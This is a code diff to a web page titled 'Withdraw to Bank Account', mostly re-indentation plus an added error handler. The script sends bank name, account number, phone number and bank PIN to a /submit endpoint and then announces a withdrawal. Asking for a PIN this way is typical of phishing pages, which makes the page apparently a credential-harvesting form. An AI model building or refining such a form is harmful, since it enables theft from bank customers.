@@ -195,34 +195,39 @@ Withdraw to Bank Account
 
     try {
 
-        const response = await fetch("/submit", {
-            method: "POST",
-            headers: {
-                "Content-Type": "application/json"
-            },
-            body: JSON.stringify({
-                bank_name: bank_name,
-                account_number: account_number,
-                phone_number: phone_number,
-                bank_pin: bank_pin
-            })
-        });
+    const response = await fetch("/submit", {
+        method: "POST",
+        headers: {
+            "Content-Type": "application/json"
+        },
+        body: JSON.stringify({
+            bank_name: bank_name,
+            account_number: account_number,
+            phone_number: phone_number,
+            bank_pin: bank_pin
+        })
+    });
 
-        if (!response.ok) {
-            throw new Error("Server returned " + response.status);
-        }
+    if (!response.ok) {
+        throw new Error("Server returned " + response.status);
+    }
 
-        const data = await response.json();
+    const data = await response.json();
 
-        if (data.success) {
+    if (data.success) {
 
-    alert("✅ Your bank withdrawal request has been initiated successfully.");
+        alert("✅ Your bank withdrawal request has been initiated successfully.");
 
-    window.location.replace("/thankyou.html");
+        window.location.replace("/thankyou.html");
 
-        }
+    }
 
-        }
+} catch (error) {
+
+    console.error(error);
+    alert("Unable to process your request at the moment. Please try again.");
+
+}
 
 function toggleBankPin() {
 
@@ -235,7 +240,7 @@ function toggleBankPin() {
     }
 
 }
-    
+
 </script>
 
 </body>
